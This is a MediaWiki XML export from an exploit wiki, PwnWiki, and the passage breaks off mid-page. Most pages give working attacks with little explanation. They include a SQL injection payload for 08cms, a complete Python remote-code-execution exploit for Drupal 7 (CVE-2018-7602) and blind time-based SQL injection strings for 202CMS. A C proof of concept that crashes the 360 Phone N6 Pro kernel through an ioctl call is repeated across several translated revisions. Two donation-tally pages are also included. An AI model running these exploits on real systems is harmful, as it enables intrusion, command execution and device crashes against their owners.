<mediawiki xmlns="http://www.mediawiki.org/xml/export-0.11/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:schemaLocation="http://www.mediawiki.org/xml/export-0.11/ http://www.mediawiki.org/xml/export-0.11.xsd" version="0.11" xml:lang="chinese">
  <siteinfo>
    <sitename>PwnWiki</sitename>
    <dbname>sql_www_pwnwiki_</dbname>
    <base>https://www.pwnwiki.org/index.php?title=Main_Page</base>
    <generator>MediaWiki 1.35.1</generator>
    <case>first-letter</case>
    <namespaces>
      <namespace key="-2" case="first-letter">Media</namespace>
      <namespace key="-1" case="first-letter">Special</namespace>
      <namespace key="0" case="first-letter" />
      <namespace key="1" case="first-letter">Talk</namespace>
      <namespace key="2" case="first-letter">User</namespace>
      <namespace key="3" case="first-letter">User talk</namespace>
      <namespace key="4" case="first-letter">PwnWiki</namespace>
      <namespace key="5" case="first-letter">PwnWiki talk</namespace>
      <namespace key="6" case="first-letter">File</namespace>
      <namespace key="7" case="first-letter">File talk</namespace>
      <namespace key="8" case="first-letter">MediaWiki</namespace>
      <namespace key="9" case="first-letter">MediaWiki talk</namespace>
      <namespace key="10" case="first-letter">Template</namespace>
      <namespace key="11" case="first-letter">Template talk</namespace>
      <namespace key="12" case="first-letter">Help</namespace>
      <namespace key="13" case="first-letter">Help talk</namespace>
      <namespace key="14" case="first-letter">Category</namespace>
      <namespace key="15" case="first-letter">Category talk</namespace>
      <namespace key="274" case="first-letter">Widget</namespace>
      <namespace key="275" case="first-letter">Widget talk</namespace>
      <namespace key="710" case="first-letter">TimedText</namespace>
      <namespace key="711" case="first-letter">TimedText talk</namespace>
      <namespace key="828" case="first-letter">Module</namespace>
      <namespace key="829" case="first-letter">Module talk</namespace>
      <namespace key="1198" case="first-letter">Translations</namespace>
      <namespace key="1199" case="first-letter">Translations talk</namespace>
    </namespaces>
  </siteinfo>
  <page>
    <title>08cms汽車房產系統 SQL注入漏洞</title>
    <ns>0</ns>
    <id>2790</id>
    <revision>
      <id>3291</id>
      <timestamp>2021-05-26T12:37:25Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==Payload== /info.php?fid=1&amp;tblprefix=cms_msession tblprefix 存在注入"</comment>
      <origin>3291</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="73" sha1="2yg3qpqxulbba7fy911vv04x78r2ckk" xml:space="preserve">==Payload==
/info.php?fid=1&amp;tblprefix=cms_msession tblprefix 存在注入</text>
      <sha1>2yg3qpqxulbba7fy911vv04x78r2ckk</sha1>
    </revision>
  </page>
  <page>
    <title>2018-7602 Drupal遠程代碼執行漏洞</title>
    <ns>0</ns>
    <id>2306</id>
    <revision>
      <id>2742</id>
      <timestamp>2021-05-08T09:02:49Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==影響版本== DRUPAL 7 &lt;= 7.58  ==EXP== &lt;pre&gt; #!/usr/bin/env python3  import requests import argparse from bs4 import BeautifulSoup  def get_args():   parser = argparse.Arg..."</comment>
      <origin>2742</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="4333" sha1="eeugz5n6st28p7gfhm9h0ha6h041w94" xml:space="preserve">==影響版本==
DRUPAL 7 &lt;= 7.58

==EXP==
&lt;pre&gt;
#!/usr/bin/env python3

import requests
import argparse
from bs4 import BeautifulSoup

def get_args():
  parser = argparse.ArgumentParser( prog="drupa7-CVE-2018-7602.py",
                    formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=50),
                    epilog= '''
                    This script will exploit the (CVE-2018-7602) vulnerability in Drupal 7 &lt;= 7.58
                    using an valid account and poisoning the cancel account form (user_cancel_confirm_form) 
                    with the 'destination' variable and triggering it with the upload file via ajax (/file/ajax).
                    ''')

  parser.add_argument("user", help="Username")
  parser.add_argument("password", help="Password")
  parser.add_argument("target", help="URL of target Drupal site (ex: http://target.com/)")
  parser.add_argument("-c", "--command", default="id", help="Command to execute (default = id)")
  parser.add_argument("-f", "--function", default="passthru", help="Function to use as attack vector (default = passthru)")
  parser.add_argument("-x", "--proxy", default="", help="Configure a proxy in the format http://127.0.0.1:8080/ (default = none)")
  args = parser.parse_args()
  return args

def pwn_target(target, username, password, function, command, proxy):
  requests.packages.urllib3.disable_warnings()
  session = requests.Session()
  proxyConf = {'http': proxy, 'https': proxy}
  try:
    print('[*] Creating a session using the provided credential...')
    get_params = {'q':'user/login'}
    post_params = {'form_id':'user_login', 'name': username, 'pass' : password, 'op':'Log in'}
    print('[*] Finding User ID...')
    session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
    get_params = {'q':'user'}
    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, "html.parser")
    user_id = soup.find('meta', {'property': 'foaf:name'}).get('about')
    if ("?q=" in user_id):
      user_id = user_id.split("=")[1]
    if(user_id):
      print('[*] User ID found: ' + user_id)
    print('[*] Poisoning a form using \'destination\' and including it in cache.')
    get_params = {'q': user_id + '/cancel'}
    r = session.get(target, params=get_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find('form', {'id': 'user-cancel-confirm-form'})
    form_token = form.find('input', {'name': 'form_token'}).get('value')
    get_params = {'q': user_id + '/cancel', 'destination' : user_id +'/cancel?q[%23post_render][]=' + function + '&amp;q[%23type]=markup&amp;q[%23markup]=' + command }
    post_params = {'form_id':'user_cancel_confirm_form','form_token': form_token, '_triggering_element_name':'form_id', 'op':'Cancel account'}
    r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
    soup = BeautifulSoup(r.text, "html.parser")
    form = soup.find('form', {'id': 'user-cancel-confirm-form'})
    form_build_id = form.find('input', {'name': 'form_build_id'}).get('value')
    if form_build_id:
        print('[*] Poisoned form ID: ' + form_build_id)
        print('[*] Triggering exploit to execute: ' + command)
        get_params = {'q':'file/ajax/actions/cancel/#options/path/' + form_build_id}
        post_params = {'form_build_id':form_build_id}
        r = session.post(target, params=get_params, data=post_params, verify=False, proxies=proxyConf)
        parsed_result = r.text.split('[{"command":"settings"')[0]
        print(parsed_result)
  except:
    print("ERROR: Something went wrong.")
    raise

def main():
  print ()
  print ('===================================================================================')
  print ('|   DRUPAL 7 &lt;= 7.58 REMOTE CODE EXECUTION (SA-CORE-2018-004 / CVE-2018-7602)     |')
  print ('|                                   by pimps                                      |')
  print ('===================================================================================\n')

  args = get_args() # get the cl args
  pwn_target(args.target.strip(),args.user.strip(),args.password.strip(), args.function.strip(), args.command.strip(), args.proxy.strip())


if __name__ == '__main__':
  main()
&lt;/pre&gt;</text>
      <sha1>eeugz5n6st28p7gfhm9h0ha6h041w94</sha1>
    </revision>
  </page>
  <page>
    <title>2021年4月贊助金額</title>
    <ns>0</ns>
    <id>1568</id>
    <revision>
      <id>1960</id>
      <timestamp>2021-04-30T14:04:26Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "2021年4月1日-2021年4月30日，總計贊助人數4人，贊助金額198.47美金。  以下表格是4月份捐贈名單： {| class="wikitable" |+ 2020年4月贊助者名..."</comment>
      <origin>1960</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="367" sha1="hwjq7fqnov8ip4ohkgbw9c3379qsuj2" xml:space="preserve">2021年4月1日-2021年4月30日，總計贊助人數4人，贊助金額198.47美金。

以下表格是4月份捐贈名單：
{| class="wikitable"
|+ 2020年4月贊助者名單
|-
| xueji_linhan || Sdr Xt 
|-
| anonymous(1) || evi1_f4iry
|}
&lt;small&gt;備註：anonymous爲不願透露ID或者希望匿名贊助的人士。&lt;/small&gt;






[[Category:PwnWiki費用統計]]</text>
      <sha1>hwjq7fqnov8ip4ohkgbw9c3379qsuj2</sha1>
    </revision>
    <revision>
      <id>1961</id>
      <parentid>1960</parentid>
      <timestamp>2021-04-30T14:04:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <minor/>
      <comment>Protected "[[2021年4月贊助金額]]": High traffic page ([Edit=Allow only administrators] (indefinite) [Move=Allow only administrators] (indefinite))</comment>
      <origin>1960</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="367" sha1="hwjq7fqnov8ip4ohkgbw9c3379qsuj2" xml:space="preserve">2021年4月1日-2021年4月30日，總計贊助人數4人，贊助金額198.47美金。

以下表格是4月份捐贈名單：
{| class="wikitable"
|+ 2020年4月贊助者名單
|-
| xueji_linhan || Sdr Xt 
|-
| anonymous(1) || evi1_f4iry
|}
&lt;small&gt;備註：anonymous爲不願透露ID或者希望匿名贊助的人士。&lt;/small&gt;






[[Category:PwnWiki費用統計]]</text>
      <sha1>hwjq7fqnov8ip4ohkgbw9c3379qsuj2</sha1>
    </revision>
  </page>
  <page>
    <title>2021年5月贊助金額</title>
    <ns>0</ns>
    <id>2524</id>
    <revision>
      <id>3017</id>
      <timestamp>2021-05-21T11:39:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "anonymous(1)  7.78USD"</comment>
      <origin>3017</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="21" sha1="lshdtgaf7g8e3qsgxkuubaycnr0by5t" xml:space="preserve">anonymous(1)  7.78USD</text>
      <sha1>lshdtgaf7g8e3qsgxkuubaycnr0by5t</sha1>
    </revision>
    <revision>
      <id>3020</id>
      <parentid>3017</parentid>
      <timestamp>2021-05-21T11:41:53Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <minor/>
      <comment>Protected "[[2021年5月贊助金額]]" ([Edit=Allow only administrators] (indefinite) [Move=Allow only administrators] (indefinite))</comment>
      <origin>3017</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="21" sha1="lshdtgaf7g8e3qsgxkuubaycnr0by5t" xml:space="preserve">anonymous(1)  7.78USD</text>
      <sha1>lshdtgaf7g8e3qsgxkuubaycnr0by5t</sha1>
    </revision>
  </page>
  <page>
    <title>202CMS v10beta - Multiple SQL注入漏洞</title>
    <ns>0</ns>
    <id>1622</id>
    <revision>
      <id>2026</id>
      <timestamp>2021-05-02T04:48:18Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "==EXP== &lt;pre&gt; =========================================================================================== # Exploit Title: 202CMS - 'log_user' SQL Inj. # Dork: N/A # Date: 20-..."</comment>
      <origin>2026</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="2514" sha1="kgjf3gb5j9h00ran1syflirtgvj22i8" xml:space="preserve">==EXP==
&lt;pre&gt;
===========================================================================================
# Exploit Title: 202CMS - 'log_user' SQL Inj.
# Dork: N/A
# Date: 20-03-2019
# Exploit Author: Mehmet EMIROGLU
# Vendor Homepage: https://sourceforge.net/projects/b202cms/
# Software Link: https://sourceforge.net/projects/b202cms/
# Version: v10 beta
# Category: Webapps
# Tested on: Wamp64, Windows
# CVE: N/A
# Software Description: 202CMS is small, but functionally CMS. It is based
on Twitter Bootstrap
  This CMS was built by Konrad and is powered by MySQLi and PHP. 202CMS is
highly customizable
  and extremely easy to setup. The script is not finished, but soon I'm
going to finish it.
===========================================================================================
# POC - SQLi (blind)
# Parameters : log_user
# Attack Pattern :
1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
# POST Method : http://localhost/202cms10beta/index.php
===========================================================================================
###########################################################################################
===========================================================================================
# Exploit Title: 202CMS - 'register.php' SQL Inj.
# Dork: N/A
# Date: 20-03-2019
# Exploit Author: Mehmet EMIROGLU
# Vendor Homepage: https://sourceforge.net/projects/b202cms/
# Software Link: https://sourceforge.net/projects/b202cms/
# Version: v10 beta
# Category: Webapps
# Tested on: Wamp64, Windows
# CVE: N/A
# Software Description: 202CMS is small, but functionally CMS. It is based
on Twitter Bootstrap
  This CMS was built by Konrad and is powered by MySQLi and PHP. 202CMS is
highly customizable
  and extremely easy to setup. The script is not finished, but soon I'm
going to finish it.
===========================================================================================
# POC - SQLi (blind)
# Parameters : register.php, reg_user,reg_mail
# Attack Pattern :
1+%2b+((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2f*%27XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%27%7c%22XOR(((SELECT+1+FROM+(SELECT+SLEEP(25))A)))OR%22*%2f
# Attack Pattern : %27%2b((SELECT+1+FROM+(SELECT+SLEEP(25))A))%2b%27
# POST Method : http://localhost/202cms10beta/register.php
===========================================================================================
            
&lt;/pre&gt;</text>
      <sha1>kgjf3gb5j9h00ran1syflirtgvj22i8</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞</title>
    <ns>0</ns>
    <id>1039</id>
    <revision>
      <id>1315</id>
      <timestamp>2021-04-10T01:34:10Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "&lt;languages   /&gt; &lt;translate&gt; ==漏洞原理== &lt;/translate&gt;  &lt;translate&gt; 360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/..."</comment>
      <origin>1315</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1473" sha1="83ymiq24zotm2l48wheuvat4im2feu3" xml:space="preserve">&lt;languages   /&gt;
&lt;translate&gt;
==漏洞原理==
&lt;/translate&gt;

&lt;translate&gt;
360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl的自變量注入精心設計的自變量，並導致內核崩潰。
&lt;/translate&gt;

&lt;translate&gt;
==漏洞影響==
&lt;/translate&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>83ymiq24zotm2l48wheuvat4im2feu3</sha1>
    </revision>
    <revision>
      <id>1316</id>
      <parentid>1315</parentid>
      <timestamp>2021-04-10T01:34:21Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Marked this version for translation</comment>
      <origin>1316</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1506" sha1="nuhbru4sarwaycm5vco60uot6phvcl2" xml:space="preserve">&lt;languages   /&gt;
&lt;translate&gt;
==漏洞原理== &lt;!--T:1--&gt;
&lt;/translate&gt;

&lt;translate&gt;
&lt;!--T:2--&gt;
360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl的自變量注入精心設計的自變量，並導致內核崩潰。
&lt;/translate&gt;

&lt;translate&gt;
==漏洞影響== &lt;!--T:3--&gt;
&lt;/translate&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>nuhbru4sarwaycm5vco60uot6phvcl2</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞/en</title>
    <ns>0</ns>
    <id>3208</id>
    <revision>
      <id>3738</id>
      <timestamp>2021-05-31T03:21:35Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "360 Phone N6 Pro Kernel Vulnerability"</comment>
      <origin>3738</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1581" sha1="c2mi7qv1wdgit266ny5jia1lyvf1h57" xml:space="preserve">&lt;languages   /&gt;
&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞原理==
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl的自變量注入精心設計的自變量，並導致內核崩潰。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>c2mi7qv1wdgit266ny5jia1lyvf1h57</sha1>
    </revision>
    <revision>
      <id>3740</id>
      <parentid>3738</parentid>
      <timestamp>2021-05-31T03:22:45Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "==Principle of the vulnerability=="</comment>
      <origin>3740</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1538" sha1="ibel5ej8afgffqrly4j6pgg26x7i96o" xml:space="preserve">&lt;languages   /&gt;
==Principle of the vulnerability==

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
360 Phone N6 Pro V096內核組件中的內核模塊允許攻擊者使用命令3235427072在設備&lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt;上通過ioctl的自變量注入精心設計的自變量，並導致內核崩潰。
&lt;/div&gt;

&lt;div lang="chinese" dir="ltr" class="mw-content-ltr"&gt;
==漏洞影響==
&lt;/div&gt;

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>ibel5ej8afgffqrly4j6pgg26x7i96o</sha1>
    </revision>
    <revision>
      <id>3750</id>
      <parentid>3740</parentid>
      <timestamp>2021-05-31T03:38:46Z</timestamp>
      <contributor>
        <username>Wosk0x01</username>
        <id>272</id>
      </contributor>
      <comment>Created page with "The kernel module in the 360 Phone N6 Pro V096 kernel component allows an attacker to use the command 3235427072 to inject variable on device &lt;code&gt;/dev/block/mmcblk0rpmb&lt;/cod..."</comment>
      <origin>3750</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1424" sha1="slkq6vgn4j2vc1mgb0smgmcyc7p0czu" xml:space="preserve">&lt;languages   /&gt;
==Principle of the vulnerability==

The kernel module in the 360 Phone N6 Pro V096 kernel component allows an attacker to use the command 3235427072 to inject variable on device &lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt; and cause the kernel to crash.

==Impact of the vulnerability==

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>slkq6vgn4j2vc1mgb0smgmcyc7p0czu</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞/he</title>
    <ns>0</ns>
    <id>3852</id>
    <revision>
      <id>4463</id>
      <timestamp>2021-06-09T10:08:12Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "מודול הליבה ברכיב הליבה 360 טלפון N6 Pro V096 מאפשר לתוקף להשתמש בפקודה 3235427072 כדי להזרים ארגומנטים שתו..."</comment>
      <origin>4463</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1527" sha1="1s0mkaclg4b561xmc4bmsh6540ioezv" xml:space="preserve">&lt;languages   /&gt;
== עקרון הפגיעות ==

מודול הליבה ברכיב הליבה 360 טלפון N6 Pro V096 מאפשר לתוקף להשתמש בפקודה 3235427072 כדי להזרים ארגומנטים שתוכננו בקפידה דרך ארגומנט ה- ioctl במכשיר &lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt; ולגרום ל גרעין לקרוס.

== השפעת פגיעות ==

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>1s0mkaclg4b561xmc4bmsh6540ioezv</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞/id</title>
    <ns>0</ns>
    <id>2800</id>
    <revision>
      <id>3301</id>
      <timestamp>2021-05-26T13:12:54Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "Kerentanan kernel 360 Phone N6 Pro"</comment>
      <origin>3301</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1472" sha1="k5burgayvxzjmwtx0fmfx29srv7q0b2" xml:space="preserve">&lt;languages   /&gt;
== Prinsip Kerentanan ==

Modul kernel dalam komponen kernel 360 Phone N6 Pro V096 memungkinkan penyerang menggunakan perintah 3235427072 untuk memasukkan argumen yang dirancang dengan cermat melalui argumen ioctl pada perangkat &lt;code&gt;/dev/block/mmcblk0rpmb&lt;/code&gt; dan menyebabkan kernel untuk crash.

== Dampak Kerentanan ==

360 Phone N6 Pro 1801-A01

==POC==
&lt;pre&gt;
/*
* This is poc of 360 N6 Pro, 1801-A01
* Android Version: 7.1.1
* Version Number: V096
* Kernel Version: Linux localhost 4.4.21-perf #1 SMP PREEMPT Wed Mar 28 15:24:20 UTC 2018 aarch64
* A NULL pointer bug in the ioctl interface of device file /dev/block/mmcblk0rpmb causes the system crash via IOCTL 3235427072.
* This Poc should run with permission to do ioctl on /dev/block/mmcblk0rpmb.
*/
#include &lt;stdio.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;errno.h&gt;
#include &lt;sys/ioctl.h&gt;

const static char *driver = "/dev/block/mmcblk0rpmb";
static command = 3235427072; // 0xc0d8b300

int main(int argc, char **argv, char **env) {
int fd = 0;
fd = open(driver, O_RDWR);
if (fd &lt; 0) {
printf("Failed to open %s, with errno %dn", driver, errno);
system("echo 1 &gt; /data/local/tmp/log");
return -1;
}

printf("Try ioctl device file '%s', with command 0x%x and payload NULLn", driver, command);
printf("System will crash and reboot.n");
if(ioctl(fd, command, NULL) &lt; 0) {
printf("Allocation of structs failed, %dn", errno);
system("echo 2 &gt; /data/local/tmp/log");
return -1;
}
close(fd);
return 0;
&lt;/pre&gt;</text>
      <sha1>k5burgayvxzjmwtx0fmfx29srv7q0b2</sha1>
    </revision>
  </page>
  <page>
    <title>360 Phone N6 Pro內核漏洞/ru</title>
    <ns>0</ns>
    <id>1415</id>
    <revision>
      <id>1786</id>
      <timestamp>2021-04-20T07:37:32Z</timestamp>
      <contributor>
        <username>Pwnwiki</username>
        <id>1</id>
      </contributor>
      <comment>Created page with "360 Phone N6 Pro уязвимость ядра"</comment>
      <origin>1786</origin>
      <model>wikitext</model>
      <format>text/x-wiki</format>
      <text bytes="1581" sha1="rf8fcoxlw6enahjgzwwvqrkkapm4x19" xml:space="preserve">&lt;languages   /&gt;
&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
==漏洞原理==
&lt;/div&gt;

&lt;div lang="zh-Hant" dir="ltr" class="mw-content-ltr"&gt;
